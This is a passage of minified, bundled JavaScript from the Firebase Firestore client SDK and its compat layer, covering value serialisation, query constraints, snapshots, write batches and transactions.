So(n,e){if(mR(n=Be(n)))return UE("Unsupported field value:",e,n),gR(n,e);if(n instanceof Rr)return function(r,i){if(!hR(i.Cu))throw i.Bu(`${r._methodName}() can only be used with update() and set()`);if(!i.path)throw i.Bu(`${r._methodName}() is not currently supported inside arrays`);let o=r._toFieldTransform(i);o&&i.fieldTransforms.push(o)}(n,e),null;if(n===void 0&&e.ignoreUndefinedProperties)return null;if(e.path&&e.fieldMask.push(e.path),n instanceof Array){if(e.settings.xu&&e.Cu!==4)throw e.Bu("Nested arrays are not supported");return function(r,i){let o=[],s=0;for(let a of r){let c=So(a,i.Lu(s));c==null&&(c={nullValue:"NULL_VALUE"}),o.push(c),s++}return{arrayValue:{values:o}}}(n,e)}return function(r,i){if((r=Be(r))===null)return{nullValue:"NULL_VALUE"};if(typeof r=="number")return ex(i.serializer,r);if(typeof r=="boolean")return{booleanValue:r};if(typeof r=="string")return{stringValue:r};if(r instanceof Date){let o=$e.fromDate(r);return{timestampValue:oa(i.serializer,o)}}if(r instanceof $e){let o=new $e(r.seconds,1e3*Math.floor(r.nanoseconds/1e3));return{timestampValue:oa(i.serializer,o)}}if(r instanceof Io)return{geoPointValue:{latitude:r.latitude,longitude:r.longitude}};if(r instanceof Jn)return{bytesValue:lx(i.serializer,r._byteString)};if(r instanceof Pe){let o=i.databaseId,s=r.firestore._databaseId;if(!s.isEqual(o))throw i.Bu(`Document reference is for database ${s.projectId}/${s.database} but should be for database ${o.projectId}/${o.database}`);return{referenceValue:fE(r.firestore._databaseId||i.databaseId,r._key.path)}}if(r instanceof Fu)return function(s,a){return{mapValue:{fields:{__type__:{stringValue:"__vector__"},value:{arrayValue:{values:s.toArray().map(c=>{if(typeof c!="number")throw a.Bu("VectorValues must only contain numeric values.");return hE(a.serializer,c)})}}}}}}(r,i);throw i.Bu(`Unsupported field value: ${_p(r)}`)}(n,e)}function gR(n,e){let t={};return FM(n)?e.path&&e.path.length>0&&e.fieldMask.push(e.path):bo(n,(r,i)=>{let o=So(i,e.Mu(r));o!=null&&(t[r]=o)}),{mapValue:{fields:t}}}function mR(n){return!(typeof n!="object"||n===null||n instanceof Array||n instanceof Date||n instanceof $e||n instanceof Io||n instanceof Jn||n instanceof Pe||n instanceof Rr||n instanceof Fu)}function UE(n,e,t){if(!mR(t)||!function(i){return typeof i=="object"&&i!==null&&(Object.getPrototypeOf(i)===Object.prototype||Object.getPrototypeOf(i)===null)}(t)){let r=_p(t);throw r==="an object"?e.Bu(n+" a custom object"):e.Bu(n+" "+r)}}function Jw(n,e,t){if((e=Be(e))instanceof Nn)return e._internalPath;if(typeof e=="string")return jE(n,e);throw cp("Field path arguments must be of type string or ",n,!1,void 0,t)}var o4=new RegExp("[~\\*/\\[\\]]");function jE(n,e,t){if(e.search(o4)>=0)throw cp(`Invalid field path (${e}). Paths must not contain '~', '*', '/', '[', or ']'`,n,!1,void 0,t);try{return new Nn(...e.split("."))._internalPath}catch{throw cp(`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`,n,!1,void 0,t)}}function cp(n,e,t,r,i){let o=r&&!r.isEmpty(),s=i!==void 0,a=`Function ${e}() called with invalid data`;t&&(a+=" (via `toFirestore()`)"),a+=". ";let c="";return(o||s)&&(c+=" (found",o&&(c+=` in field ${r}`),s&&(c+=` in document ${i}`),c+=")"),new k(N.INVALID_ARGUMENT,a+n+c)}function yR(n,e){return n.some(t=>t.isEqual(e))}var Do=class{constructor(e,t,r,i,o){this._firestore=e,this._userDataWriter=t,this._key=r,this._document=i,this._converter=o}get id(){return this._key.path.lastSegment()}get ref(){return new Pe(this._firestore,this._converter,this._key)}exists(){return this._document!==null}data(){if(this._document){if(this._converter){let e=new Xw(this._firestore,this._userDataWriter,this._key,this._document,null);return this._converter.fromFirestore(e)}return this._userDataWriter.convertValue(this._document.data.value)}}get(e){if(this._document){let t=this._document.data.field(Ep("DocumentSnapshot.get",e));if(t!==null)return this._userDataWriter.convertValue(t)}}},Xw=class extends Do{data(){return super.data()}};function Ep(n,e){return typeof e=="string"?jE(n,e):e instanceof Nn?e._internalPath:e._delegate._internalPath}function vR(n){if(n.limitType==="L"&&n.explicitOrderBy.length===0)throw new k(N.UNIMPLEMENTED,"limitToLast() queries require specifying at least one orderBy() clause")}var Lu=class{},Co=class extends Lu{};function kr(n,e,...t){let r=[];e instanceof Lu&&r.push(e),r=r.concat(t),function(o){let s=o.filter(c=>c instanceof eE).length,a=o.filter(c=>c instanceof up).length;if(s>1||s>0&&a>0)throw new k(N.INVALID_ARGUMENT,"InvalidQuery. When using composite filters, you cannot use more than one filter at the top level. Consider nesting the multiple filters within an `and(...)` statement. For example: change `query(query, where(...), or(...))` to `query(query, and(where(...), or(...)))`.")}(r);for(let i of r)n=i._apply(n);return n}var up=class n extends Co{constructor(e,t,r){super(),this._field=e,this._op=t,this._value=r,this.type="where"}static _create(e,t,r){return new n(e,t,r)}_apply(e){let t=this._parse(e);return AR(e._query,t),new yt(e.firestore,e.converter,x_(e._query,t))}_parse(e){let t=To(e.firestore);return function(o,s,a,c,l,h,p){let m;if(l.isKeyField()){if(h==="array-contains"||h==="array-contains-any")throw new k(N.INVALID_ARGUMENT,`Invalid Query. You can't perform '${h}' queries on documentId().`);if(h==="in"||h==="not-in"){DM(p,h);let y=[];for(let D of p)y.push(IM(c,o,D));m={arrayValue:{values:y}}}else m=IM(c,o,p)}else h!=="in"&&h!=="not-in"&&h!=="array-contains-any"||DM(p,h),m=pR(a,s,p,h==="in"||h==="not-in");return ge.create(l,h,m)}(e._query,"where",t,e.firestore._databaseId,this._field,this._op,this._value)}};function _R(n,e,t){let r=e,i=Ep("where",n);return up._create(i,r,t)}var eE=class n extends Lu{constructor(e,t){super(),this.type=e,this._queryConstraints=t}static _create(e,t){return new n(e,t)}_parse(e){let t=this._queryConstraints.map(r=>r._parse(e)).filter(r=>r.getFilters().length>0);return t.length===1?t[0]:Se.create(t,this._getOperator())}_apply(e){let t=this._parse(e);return t.getFilters().length===0?e:(function(i,o){let s=i,a=o.getFlattenedFilters();for(let c of a)AR(s,c),s=x_(s,c)}(e._query,t),new yt(e.firestore,e.converter,x_(e._query,t)))}_getQueryConstraints(){return this._queryConstraints}_getOperator(){return this.type==="and"?"and":"or"}};var tE=class n extends Co{constructor(e,t){super(),this._field=e,this._direction=t,this.type="orderBy"}static _create(e,t){return new n(e,t)}_apply(e){let t=function(i,o,s){if(i.startAt!==null)throw new k(N.INVALID_ARGUMENT,"Invalid query. You must not call startAt() or startAfter() before calling orderBy().");if(i.endAt!==null)throw new k(N.INVALID_ARGUMENT,"Invalid query. You must not call endAt() or endBefore() before calling orderBy().");return new mo(o,s)}(e._query,this._field,this._direction);return new yt(e.firestore,e.converter,function(i,o){let s=i.explicitOrderBy.concat([o]);return new xn(i.path,i.collectionGroup,s,i.filters.slice(),i.limit,i.limitType,i.startAt,i.endAt)}(e._query,t))}};function wR(n,e="asc"){let t=e,r=Ep("orderBy",n);return tE._create(r,t)}var lp=class n extends Co{constructor(e,t,r){super(),this.type=e,this._limit=t,this._limitType=r}static _create(e,t,r){return new n(e,t,r)}_apply(e){return new yt(e.firestore,e.converter,Af(e._query,this._limit,this._limitType))}};function ER(n){return Jx("limit",n),lp._create("limit",n,"F")}function IR(n){return Jx("limitToLast",n),lp._create("limitToLast",n,"L")}var dp=class n extends Co{constructor(e,t,r){super(),this.type=e,this._docOrFields=t,this._inclusive=r}static _create(e,t,r){return new n(e,t,r)}_apply(e){let t=SR(e,this.type,this._docOrFields,this._inclusive);return new yt(e.firestore,e.converter,function(i,o){return new xn(i.path,i.collectionGroup,i.explicitOrderBy.slice(),i.filters.slice(),i.limit,i.limitType,o,i.endAt)}(e._query,t))}};function DR(...n){return dp._create("startAt",n,!0)}function CR(...n){return dp._create("startAfter",n,!1)}var hp=class n extends Co{constructor(e,t,r){super(),this.type=e,this._docOrFields=t,this._inclusive=r}static _create(e,t,r){return new n(e,t,r)}_apply(e){let t=SR(e,this.type,this._docOrFields,this._inclusive);return new yt(e.firestore,e.converter,function(i,o){return new xn(i.path,i.collectionGroup,i.explicitOrderBy.slice(),i.filters.slice(),i.limit,i.limitType,i.startAt,o)}(e._query,t))}};function bR(...n){return hp._create("endBefore",n,!1)}function TR(...n){return hp._create("endAt",n,!0)}function SR(n,e,t,r){if(t[0]=Be(t[0]),t[0]instanceof Do)return function(o,s,a,c,l){if(!c)throw new k(N.NOT_FOUND,`Can't use a DocumentSnapshot that doesn't exist for ${a}().`);let h=[];for(let p of Zs(o))if(p.field.isKeyField())h.push(go(s,c.key));else{let m=c.data.field(p.field);if(pp(m))throw new k(N.INVALID_ARGUMENT,'Invalid query. You are trying to start or end a query using a document for which the field "'+p.field+'" is an uncommitted server timestamp. (Since the value of this field is unknown, you cannot start/end a query with it.)');if(m===null){let y=p.field.canonicalString();throw new k(N.INVALID_ARGUMENT,`Invalid query. You are trying to start or end a query using a document for which the field '${y}' (used as the orderBy) does not exist.`)}h.push(m)}return new Yn(h,l)}(n._query,n.firestore._databaseId,e,t[0]._document,r);{let i=To(n.firestore);return function(s,a,c,l,h,p){let m=s.explicitOrderBy;if(h.length>m.length)throw new k(N.INVALID_ARGUMENT,`Too many arguments provided to ${l}(). The number of arguments must be less than or equal to the number of orderBy() clauses`);let y=[];for(let D=0;D<h.length;D++){let b=h[D];if(m[D].field.isKeyField()){if(typeof b!="string")throw new k(N.INVALID_ARGUMENT,`Invalid query. Expected a string for document ID in ${l}(), but got a ${typeof b}`);if(!lE(s)&&b.indexOf("/")!==-1)throw new k(N.INVALID_ARGUMENT,`Invalid query. When querying a collection and ordering by documentId(), the value passed to ${l}() must be a plain document ID, but '${b}' contains a slash.`);let T=s.path.child(ve.fromString(b));if(!q.isDocumentKey(T))throw new k(N.INVALID_ARGUMENT,`Invalid query. When querying a collection group and ordering by documentId(), the value passed to ${l}() must result in a valid document path, but '${T}' is not because it contains an odd number of segments.`);let F=new q(T);y.push(go(a,F))}else{let T=pR(c,l,b);y.push(T)}}return new Yn(y,p)}(n._query,n.firestore._databaseId,i,e,t,r)}}function IM(n,e,t){if(typeof(t=Be(t))=="string"){if(t==="")throw new k(N.INVALID_ARGUMENT,"Invalid query. When querying with documentId(), you must provide a valid document ID, but it was an empty string.");if(!lE(e)&&t.indexOf("/")!==-1)throw new k(N.INVALID_ARGUMENT,`Invalid query. When querying a collection by documentId(), you must provide a plain document ID, but '${t}' contains a '/' character.`);let r=e.path.child(ve.fromString(t));if(!q.isDocumentKey(r))throw new k(N.INVALID_ARGUMENT,`Invalid query. When querying a collection group by documentId(), the value provided must result in a valid document path, but '${r}' is not because it has an odd number of segments (${r.length}).`);return go(n,new q(r))}if(t instanceof Pe)return go(n,t._key);throw new k(N.INVALID_ARGUMENT,`Invalid query. When querying with documentId(), you must provide a valid string or a DocumentReference, but it was: ${_p(t)}.`)}function DM(n,e){if(!Array.isArray(n)||n.length===0)throw new k(N.INVALID_ARGUMENT,`Invalid Query. A non-empty array is required for '${e.toString()}' filters.`)}function AR(n,e){let t=function(i,o){for(let s of i)for(let a of s.getFlattenedFilters())if(o.indexOf(a.op)>=0)return a.op;return null}(n.filters,function(i){switch(i){case"!=":return["!=","not-in"];case"array-contains-any":case"in":return["not-in"];case"not-in":return["array-contains-any","in","not-in","!="];default:return[]}}(e.op));if(t!==null)throw t===e.op?new k(N.INVALID_ARGUMENT,`Invalid query. You cannot use more than one '${e.op.toString()}' filter.`):new k(N.INVALID_ARGUMENT,`Invalid query. You cannot use '${e.op.toString()}' filters with '${t.toString()}' filters.`)}var ga=class{convertValue(e,t="none"){switch(po(e)){case 0:return null;case 1:return e.booleanValue;case 2:return je(e.integerValue||e.doubleValue);case 3:return this.convertTimestamp(e.timestampValue);case 4:return this.convertServerTimestamp(e,t);case 5:return e.stringValue;case 6:return this.convertBytes(wi(e.bytesValue));case 7:return this.convertReference(e.referenceValue);case 8:return this.convertGeoPoint(e.geoPointValue);case 9:return this.convertArray(e.arrayValue,t);case 11:return this.convertObject(e.mapValue,t);case 10:return this.convertVectorValue(e.mapValue);default:throw z()}}convertObject(e,t){return this.convertObjectMap(e.fields,t)}convertObjectMap(e,t="none"){let r={};return bo(e,(i,o)=>{r[i]=this.convertValue(o,t)}),r}convertVectorValue(e){var t,r,i;let o=(i=(r=(t=e.fields)===null||t===void 0?void 0:t.value.arrayValue)===null||r===void 0?void 0:r.values)===null||i===void 0?void 0:i.map(s=>je(s.doubleValue));return new Fu(o)}convertGeoPoint(e){return new Io(je(e.latitude),je(e.longitude))}convertArray(e,t){return(e.values||[]).map(r=>this.convertValue(r,t))}convertServerTimestamp(e,t){switch(t){case"previous":let r=cE(e);return r==null?null:this.convertValue(r,t);case"estimate":return this.convertTimestamp(Eu(e));default:return null}}convertTimestamp(e){let t=Ar(e);return new $e(t.seconds,t.nanos)}convertDocumentKey(e,t){let r=ve.fromString(e);Q(Ex(r));let i=new Ei(r.get(1),r.get(3)),o=new q(r.popFirst(5));return i.isEqual(t)||Ze(`Document ${o} contains a document reference within a different database (${i.projectId}/${i.database}) which is not supported. It will be treated as a reference in the current database (${t.projectId}/${t.database}) instead.`),o}};function Ip(n,e,t){let r;return r=n?t&&(t.merge||t.mergeFields)?n.toFirestore(e,t):n.toFirestore(e):e,r}var nE=class extends ga{constructor(e){super(),this.firestore=e}convertBytes(e){return new Jn(e)}convertReference(e){let t=this.convertDocumentKey(e,this.firestore._databaseId);return new Pe(this.firestore,null,t)}};var Sr=class{constructor(e,t){this.hasPendingWrites=e,this.fromCache=t}isEqual(e){return this.hasPendingWrites===e.hasPendingWrites&&this.fromCache===e.fromCache}},yn=class extends Do{constructor(e,t,r,i,o,s){super(e,t,r,i,s),this._firestore=e,this._firestoreImpl=e,this.metadata=o}exists(){return super.exists()}data(e={}){if(this._document){if(this._converter){let t=new yi(this._firestore,this._userDataWriter,this._key,this._document,this.metadata,null);return this._converter.fromFirestore(t,e)}return this._userDataWriter.convertValue(this._document.data.value,e.serverTimestamps)}}get(e,t={}){if(this._document){let r=this._document.data.field(Ep("DocumentSnapshot.get",e));if(r!==null)return this._userDataWriter.convertValue(r,t.serverTimestamps)}}},yi=class extends yn{data(e={}){return super.data(e)}},Pn=class{constructor(e,t,r,i){this._firestore=e,this._userDataWriter=t,this._snapshot=i,this.metadata=new Sr(i.hasPendingWrites,i.fromCache),this.query=r}get docs(){let e=[];return this.forEach(t=>e.push(t)),e}get size(){return this._snapshot.docs.size}get empty(){return this.size===0}forEach(e,t){this._snapshot.docs.forEach(r=>{e.call(t,new yi(this._firestore,this._userDataWriter,r.key,r,new Sr(this._snapshot.mutatedKeys.has(r.key),this._snapshot.fromCache),this.query.converter))})}docChanges(e={}){let t=!!e.includeMetadataChanges;if(t&&this._snapshot.excludesMetadataChanges)throw new k(N.INVALID_ARGUMENT,"To include metadata changes with your document changes, you must also pass { includeMetadataChanges:true } to onSnapshot().");return this._cachedChanges&&this._cachedChangesIncludeMetadataChanges===t||(this._cachedChanges=function(i,o){if(i._snapshot.oldDocs.isEmpty()){let s=0;return i._snapshot.docChanges.map(a=>{let c=new yi(i._firestore,i._userDataWriter,a.doc.key,a.doc,new Sr(i._snapshot.mutatedKeys.has(a.doc.key),i._snapshot.fromCache),i.query.converter);return a.doc,{type:"added",doc:c,oldIndex:-1,newIndex:s++}})}{let s=i._snapshot.oldDocs;return i._snapshot.docChanges.filter(a=>o||a.type!==3).map(a=>{let c=new yi(i._firestore,i._userDataWriter,a.doc.key,a.doc,new Sr(i._snapshot.mutatedKeys.has(a.doc.key),i._snapshot.fromCache),i.query.converter),l=-1,h=-1;return a.type!==0&&(l=s.indexOf(a.doc.key),s=s.delete(a.doc.key)),a.type!==1&&(s=s.add(a.doc),h=s.indexOf(a.doc.key)),{type:s4(a.type),doc:c,oldIndex:l,newIndex:h}})}}(this,t),this._cachedChangesIncludeMetadataChanges=t),this._cachedChanges}};function s4(n){switch(n){case 0:return"added";case 2:case 3:return"modified";case 1:return"removed";default:return z()}}function BE(n,e){return n instanceof yn&&e instanceof yn?n._firestore===e._firestore&&n._key.isEqual(e._key)&&(n._document===null?e._document===null:n._document.isEqual(e._document))&&n._converter===e._converter:n instanceof Pn&&e instanceof Pn&&n._firestore===e._firestore&&FE(n.query,e.query)&&n.metadata.isEqual(e.metadata)&&n._snapshot.isEqual(e._snapshot)}function MR(n){n=we(n,Pe);let e=we(n.firestore,He);return Qx(vt(e),n._key).then(t=>zE(e,n,t))}var Nr=class extends ga{constructor(e){super(),this.firestore=e}convertBytes(e){return new Jn(e)}convertReference(e){let t=this.convertDocumentKey(e,this.firestore._databaseId);return new Pe(this.firestore,null,t)}};function xR(n){n=we(n,Pe);let e=we(n.firestore,He),t=vt(e),r=new Nr(e);return X$(t,n._key).then(i=>new yn(e,r,n._key,i,new Sr(i!==null&&i.hasLocalMutations,!0),n.converter))}function RR(n){n=we(n,Pe);let e=we(n.firestore,He);return Qx(vt(e),n._key,{source:"server"}).then(t=>zE(e,n,t))}function NR(n){n=we(n,yt);let e=we(n.firestore,He),t=vt(e),r=new Nr(e);return vR(n._query),Yx(t,n._query).then(i=>new Pn(e,r,n,i))}function PR(n){n=we(n,yt);let e=we(n.firestore,He),t=vt(e),r=new Nr(e);return e4(t,n._query).then(i=>new Pn(e,r,n,i))}function kR(n){n=we(n,yt);let e=we(n.firestore,He),t=vt(e),r=new Nr(e);return Yx(t,n._query,{source:"server"}).then(i=>new Pn(e,r,n,i))}function $E(n,e,t){n=we(n,Pe);let r=we(n.firestore,He),i=Ip(n.converter,e,t);return Ia(r,[wp(To(r),"setDoc",n._key,i,n.converter!==null,t).toMutation(n._key,We.none())])}function HE(n,e,t,...r){n=we(n,Pe);let i=we(n.firestore,He),o=To(i),s;return s=typeof(e=Be(e))=="string"||e instanceof Nn?LE(o,"updateDoc",n._key,e,t,r):VE(o,"updateDoc",n._key,e),Ia(i,[s.toMutation(n._key,We.exists(!0))])}function OR(n){return Ia(we(n.firestore,He),[new Ti(n._key,We.none())])}function FR(n,e){let t=we(n.firestore,He),r=zu(n),i=Ip(n.converter,e);return Ia(t,[wp(To(n.firestore),"addDoc",r._key,i,n.converter!==null,{}).toMutation(r._key,We.exists(!1))]).then(()=>r)}function qE(n,...e){var t,r,i;n=Be(n);let o={includeMetadataChanges:!1,source:"default"},s=0;typeof e[s]!="object"||qw(e[s])||(o=e[s],s++);let a={includeMetadataChanges:o.includeMetadataChanges,source:o.source};if(qw(e[s])){let p=e[s];e[s]=(t=p.next)===null||t===void 0?void 0:t.bind(p),e[s+1]=(r=p.error)===null||r===void 0?void 0:r.bind(p),e[s+2]=(i=p.complete)===null||i===void 0?void 0:i.bind(p)}let c,l,h;if(n instanceof Pe)l=we(n.firestore,He),h=ya(n._key.path),c={next:p=>{e[s]&&e[s](zE(l,n,p))},error:e[s+1],complete:e[s+2]};else{let p=we(n,yt);l=we(p.firestore,He),h=p._query;let m=new Nr(l);c={next:y=>{e[s]&&e[s](new Pn(l,m,p,y))},error:e[s+1],complete:e[s+2]},vR(n._query)}return function(m,y,D,b){let T=new fa(b),F=new Ou(y,T,D);return m.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){return wE(yield pa(m),F)})),()=>{T.Za(),m.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){return EE(yield pa(m),F)}))}}(vt(l),h,a,c)}function VR(n,e){return t4(vt(n=we(n,He)),qw(e)?e:{next:e})}function Ia(n,e){return function(r,i){let o=new lt;return r.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){return k$(yield RE(r),i,o)})),o.promise}(vt(n),e)}function zE(n,e,t){let r=t.docs.get(e._key),i=new Nr(n);return new yn(n,i,e._key,r,new Sr(t.hasPendingWrites,t.fromCache),e.converter)}var a4={maxAttempts:5};var fp=class{constructor(e,t){this._firestore=e,this._commitHandler=t,this._mutations=[],this._committed=!1,this._dataReader=To(e)}set(e,t,r){this._verifyNotCommitted();let i=gi(e,this._firestore),o=Ip(i.converter,t,r),s=wp(this._dataReader,"WriteBatch.set",i._key,o,i.converter!==null,r);return this._mutations.push(s.toMutation(i._key,We.none())),this}update(e,t,r,...i){this._verifyNotCommitted();let o=gi(e,this._firestore),s;return s=typeof(t=Be(t))=="string"||t instanceof Nn?LE(this._dataReader,"WriteBatch.update",o._key,t,r,i):VE(this._dataReader,"WriteBatch.update",o._key,t),this._mutations.push(s.toMutation(o._key,We.exists(!0))),this}delete(e){this._verifyNotCommitted();let t=gi(e,this._firestore);return this._mutations=this._mutations.concat(new Ti(t._key,We.none())),this}commit(){return this._verifyNotCommitted(),this._committed=!0,this._mutations.length>0?this._commitHandler(this._mutations):Promise.resolve()}_verifyNotCommitted(){if(this._committed)throw new k(N.FAILED_PRECONDITION,"A write batch can no longer be used after commit() has been called.")}};function gi(n,e){if((n=Be(n)).firestore!==e)throw new k(N.INVALID_ARGUMENT,"Provided document reference is from a different Firestore instance.");return n}var rE=class extends class{constructor(t,r){this._firestore=t,this._transaction=r,this._dataReader=To(t)}get(t){let r=gi(t,this._firestore),i=new nE(this._firestore);return this._transaction.lookup([r._key]).then(o=>{if(!o||o.length!==1)return z();let s=o[0];if(s.isFoundDocument())return new Do(this._firestore,i,s.key,s,r.converter);if(s.isNoDocument())return new Do(this._firestore,i,r._key,null,r.converter);throw z()})}set(t,r,i){let o=gi(t,this._firestore),s=Ip(o.converter,r,i),a=wp(this._dataReader,"Transaction.set",o._key,s,o.converter!==null,i);return this._transaction.set(o._key,a),this}update(t,r,i,...o){let s=gi(t,this._firestore),a;return a=typeof(r=Be(r))=="string"||r instanceof Nn?LE(this._dataReader,"Transaction.update",s._key,r,i,o):VE(this._dataReader,"Transaction.update",s._key,r),this._transaction.update(s._key,a),this}delete(t){let r=gi(t,this._firestore);return this._transaction.delete(r._key),this}}{constructor(e,t){super(e,t),this._firestore=e}get(e){let t=gi(e,this._firestore),r=new Nr(this._firestore);return super.get(e).then(i=>new yn(this._firestore,r,t._key,i._document,new Sr(!1,!1),t.converter))}};function LR(n,e,t){n=we(n,He);let r=Object.assign(Object.assign({},a4),t);return function(o){if(o.maxAttempts<1)throw new k(N.INVALID_ARGUMENT,"Max attempts must be at least 1")}(r),function(o,s,a){let c=new lt;return o.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){let l=yield Y$(o);new $w(o.asyncQueue,l,a,s,c).au()})),c.promise}(vt(n),i=>e(new rE(n,i)),r)}function UR(){return new Vu("deleteField")}function jR(){return new Kw("serverTimestamp")}function BR(...n){return new Qw("arrayUnion",n)}function $R(...n){return new Yw("arrayRemove",n)}function HR(n){return new Zw("increment",n)}(function(e,t=!0){(function(i){ma=i})(uD),Ga(new Oi("firestore",(r,{instanceIdentifier:i,options:o})=>{let s=r.getProvider("app").getImmediate(),a=new He(new a_(r.getProvider("auth-internal")),new d_(r.getProvider("app-check-internal")),function(l,h){if(!Object.prototype.hasOwnProperty.apply(l.options,["projectId"]))throw new k(N.INVALID_ARGUMENT,'"projectId" not provided in firebase.initializeApp.');return new Ei(l.options.projectId,h)}(s,i),s);return o=Object.assign({useFetchStreams:t},o),a._setSettings(o),a},"PUBLIC").setMultipleInstances(!0)),Ur(EA,"4.7.3",e),Ur(EA,"4.7.3","esm2017")})();var c4="@firebase/firestore-compat",u4="0.3.38";function ZE(n,e){if(e===void 0)return{merge:!1};if(e.mergeFields!==void 0&&e.merge!==void 0)throw new k("invalid-argument",`Invalid options passed to function ${n}(): You cannot specify both "merge" and "mergeFields".`);return e}function qR(){if(typeof Uint8Array>"u")throw new k("unimplemented","Uint8Arrays are not available in this environment.")}function zR(){if(!VM())throw new k("unimplemented","Blobs are unavailable in Firestore in this environment.")}var Dp=class n{constructor(e){this._delegate=e}static fromBase64String(e){return zR(),new n(Jn.fromBase64String(e))}static fromUint8Array(e){return qR(),new n(Jn.fromUint8Array(e))}toBase64(){return zR(),this._delegate.toBase64()}toUint8Array(){return qR(),this._delegate.toUint8Array()}isEqual(e){return this._delegate.isEqual(e._delegate)}toString(){return"Blob(base64: "+this.toBase64()+")"}};function GE(n){return l4(n,["next","error","complete"])}function l4(n,e){if(typeof n!="object"||n===null)return!1;let t=n;for(let r of e)if(r in t&&typeof t[r]=="function")return!0;return!1}var WE=class{enableIndexedDbPersistence(e,t){return rR(e._delegate,{forceOwnership:t})}enableMultiTabIndexedDbPersistence(e){return iR(e._delegate)}clearIndexedDbPersistence(e){return sR(e._delegate)}},Cp=class{constructor(e,t,r){this._delegate=t,this._persistenceProvider=r,this.INTERNAL={delete:()=>this.terminate()},e instanceof Ei||(this._appCompat=e)}get _databaseId(){return this._delegate._databaseId}settings(e){let t=this._delegate._getSettings();!e.merge&&t.host!==e.host&&Mn("You are overriding the original host. If you did not intend to override your settings, use {merge: true}."),e.merge&&(e=Object.assign(Object.assign({},t),e),delete e.merge),this._delegate._setSettings(e)}useEmulator(e,t,r={}){Xx(this._delegate,e,t,r)}enableNetwork(){return cR(this._delegate)}disableNetwork(){return uR(this._delegate)}enablePersistence(e){let t=!1,r=!1;return e&&(t=!!e.synchronizeTabs,r=!!e.experimentalForceOwningTab,PE("synchronizeTabs",t,"experimentalForceOwningTab",r)),t?this._persistenceProvider.enableMultiTabIndexedDbPersistence(this):this._persistenceProvider.enableIndexedDbPersistence(this,r)}clearPersistence(){return this._persistenceProvider.clearIndexedDbPersistence(this)}terminate(){return this._appCompat&&(this._appCompat._removeServiceInstance("firestore-compat"),this._appCompat._removeServiceInstance("firestore")),this._delegate._delete()}waitForPendingWrites(){return aR(this._delegate)}onSnapshotsInSync(e){return VR(this._delegate,e)}get app(){if(!this._appCompat)throw new k("failed-precondition","Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._appCompat}collection(e){try{return new ba(this,kE(this._delegate,e))}catch(t){throw Ut(t,"collection()","Firestore.collection()")}}doc(e){try{return new Xn(this,zu(this._delegate,e))}catch(t){throw Ut(t,"doc()","Firestore.doc()")}}collectionGroup(e){try{return new Ro(this,eR(this._delegate,e))}catch(t){throw Ut(t,"collectionGroup()","Firestore.collectionGroup()")}}runTransaction(e){return LR(this._delegate,t=>e(new bp(this,t)))}batch(){return vt(this._delegate),new Tp(new fp(this._delegate,e=>Ia(this._delegate,e)))}loadBundle(e){return lR(this._delegate,e)}namedQuery(e){return dR(this._delegate,e).then(t=>t?new Ro(this,t):null)}},Da=class extends ga{constructor(e){super(),this.firestore=e}convertBytes(e){return new Dp(new Jn(e))}convertReference(e){let t=this.convertDocumentKey(e,this.firestore._databaseId);return Xn.forKey(t,this.firestore,null)}};function d4(n){CM(n)}var bp=class{constructor(e,t){this._firestore=e,this._delegate=t,this._userDataWriter=new Da(e)}get(e){let t=Ao(e);return this._delegate.get(t).then(r=>new Mo(this._firestore,new yn(this._firestore._delegate,this._userDataWriter,r._key,r._document,r.metadata,t.converter)))}set(e,t,r){let i=Ao(e);return r?(ZE("Transaction.set",r),this._delegate.set(i,t,r)):this._delegate.set(i,t),this}update(e,t,r,...i){let o=Ao(e);return arguments.length===2?this._delegate.update(o,t):this._delegate.update(o,t,r,...i),this}delete(e){let t=Ao(e);return this._delegate.delete(t),this}},Tp=class{constructor(e){this._delegate=e}set(e,t,r){let i=Ao(e);return r?(ZE("WriteBatch.set",r),this._delegate.set(i,t,r)):this._delegate.set(i,t),this}update(e,t,r,...i){let o=Ao(e);return arguments.length===2?this._delegate.update(o,t):this._delegate.update(o,t,r,...i),this}delete(e){let t=Ao(e);return this._delegate.delete(t),this}commit(){return this._delegate.commit()}},Ca=class n{constructor(e,t,r){this._firestore=e,this._userDataWriter=t,this._delegate=r}fromFirestore(e,t){let r=new yi(this._firestore._delegate,this._userDataWriter,e._key,e._document,e.metadata,null);return this._delegate.fromFirestore(new xo(this._firestore,r),t??{})}toFirestore(e,t){return t?this._delegate.toFirestore(e,t):this._delegate.toFirestore(e)}static getInstance(e,t){let r=n.INSTANCES,i=r.get(e);i||(i=new WeakMap,r.set(e,i));let o=i.get(t);return o||(o=new n(e,new Da(e),t),i.set(t,o)),o}};Ca.INSTANCES=new WeakMap;var Xn=class n{constructor(e,t){this.firestore=e,this._delegate=t,this._userDataWriter=new Da(e)}static forPath(e,t,r){if(e.length%2!==0)throw new k("invalid-argument",`Invalid document reference. Document references must have an even number of segments, but ${e.canonicalString()} has ${e.length}`);return new n(t,new Pe(t._delegate,r,new q(e)))}static forKey(e,t,r){return new n(t,new Pe(t._delegate,r,e))}get id(){return this._delegate.id}get parent(){return new ba(this.firestore,this._delegate.parent)}get path(){return this._delegate.path}collection(e){try{return new ba(this.firestore,kE(this._delegate,e))}catch(t){throw Ut(t,"collection()","DocumentReference.collection()")}}isEqual(e){return e=Be(e),e instanceof Pe?OE(this._delegate,e):!1}set(e,t){t=ZE("DocumentReference.set",t);try{return t?$E(this._delegate,e,t):$E(this._delegate,e)}catch(r){throw Ut(r,"setDoc()","DocumentReference.set()")}}update(e,t,...r){try{return arguments.length===1?HE(this._delegate,e):HE(this._delegate,e,t,...r)}catch(i){throw Ut(i,"updateDoc()","DocumentReference.update()")}}delete(){return OR(this._delegate)}onSnapshot(...e){let t=GR(e),r=WR(e,i=>new Mo(this.firestore,new yn(this.firestore._delegate,this._userDataWriter,i._key,i._document,i.metadata,this._delegate.converter)));return qE(this._delegate,t,r)}get(e){let t;return e?.source==="cache"?t=xR(this._delegate):e?.source==="server"?t=RR(this._delegate):t=MR(this._delegate),t.then(r=>new Mo(this.firestore,new yn(this.firestore._delegate,this._userDataWriter,r._key,r._document,r.metadata,this._delegate.converter)))}withConverter(e){return new n(this.firestore,e?this._delegate.withConverter(Ca.getInstance(this.firestore,e)):this._delegate.withConverter(null))}};function Ut(n,e,t){return 